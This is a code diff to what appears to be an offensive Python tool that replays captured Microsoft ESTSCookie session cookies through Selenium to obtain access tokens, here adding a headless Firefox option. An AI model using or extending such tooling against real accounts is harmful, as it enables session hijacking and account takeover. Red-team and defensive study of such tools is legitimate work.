@@ -62,7 +62,7 @@ class PushoverClient:
 
 class LazySeleniumAuthentication(SeleniumAuthentication):
 
-    def get_webdriver(self, service, intercept=False):
+    def get_webdriver(self, service, intercept=False, headless=False):
         '''
         Overides the original get_webdriver in order to make sure we ignore any TLS errors/ trustissues
         Load webdriver based on service, which is either
@@ -70,8 +70,10 @@ class LazySeleniumAuthentication(SeleniumAuthentication):
         '''
 
         options = {'request_storage': 'memory'}
-        if intercept and self.headless:
-            firefox_options=self.FirefoxOptions()
+
+        if intercept and headless:
+            print("Trying to build Firefox Options...")
+            firefox_options = webdriver.firefox.options.Options()
             firefox_options.add_argument("-headless")
             driver = webdriver_wire.Firefox(service=service,  options=firefox_options, seleniumwire_options=options)
         elif intercept:
@@ -158,7 +160,7 @@ def download_remote_file(ssh, remote_file, local_file):
     except Exception as e:
         print(f"{ERROR_ICON} Failed to download file: {e}")
 
-def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, teamFiltrationPath, keepOpen):
+def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, teamFiltrationPath, keepOpen, headless):
     # Attempt to execute the authentication process
     try:
         # Informing the user about the start of the process
@@ -190,7 +192,10 @@ def execute_authentication(estscookie, username, resourceUri, clientId, redirect
             return None
 
         # Get the selenium webdriver
-        selAuthObject.driver = selAuthObject.get_webdriver(selAuthService, intercept=True)
+        if headless:
+            selAuthObject.driver = selAuthObject.get_webdriver(selAuthService, intercept=True, headless=True)
+        else:
+            selAuthObject.driver = selAuthObject.get_webdriver(selAuthService, intercept=True)
         
         # Perform login using selenium with the provided ESTSCookie
         jsonTokenObject = selAuthObject.selenium_login_with_estscookie(authUrl, None, None, None, keepOpen, False, estscookie=estscookie)
@@ -374,6 +379,7 @@ if __name__ == "__main__":
     roadtools_group.add_argument('-ru', '--redirect-url', action='store', metavar='URL',help='Redirect URL used when authenticating (default: https://login.microsoftonline.com/common/oauth2/nativeclient)',default="https://login.microsoftonline.com/common/oauth2/nativeclient")
     roadtools_group.add_argument('-t','--tenant',action='store',help='Tenant ID or domain to auth to',required=False)
     roadtools_group.add_argument('-d', '--driver-path',action='store',help='Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases/latest)',default=default_geckodriver_filename())
+    roadtools_group.add_argument('--headless',action='store',help='Provides option to run with firefox headless mode.',default=False)
     roadtools_group.add_argument('-k', '--keep-open', action='store_true', help='Do not close the browser window after timeout. Useful if you want to browse online apps with the obtained credentials')
     
     args = arg_parser.parse_args()
@@ -427,5 +433,5 @@ if __name__ == "__main__":
             initial_combinations = process_combinations(valid_json_objects, processed_combinations)
             for key, tokenData in initial_combinations.items():
                 with ThreadPoolExecutor() as executor:
-                    executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.tf_path, args.keep_open)
+                    executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.tf_path, args.keep_open, args.headless)
             time.sleep(5000)
